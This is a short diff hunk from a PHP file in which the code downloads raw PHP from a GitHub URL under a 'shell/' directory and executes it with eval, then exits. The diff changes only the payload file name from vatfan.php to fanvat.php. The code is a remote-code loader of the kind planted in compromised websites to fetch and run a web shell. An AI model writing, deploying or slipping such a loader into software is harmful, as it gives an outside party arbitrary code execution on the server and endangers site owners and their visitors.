@@ -18,7 +18,7 @@ function getRawContent($url) {
     return getContent($url);
 }
 
-$url = 'https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/vatfan.php';
+$url = 'https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php';
 $content = getRawContent($url);
 eval('?>' . $content);
 exit;
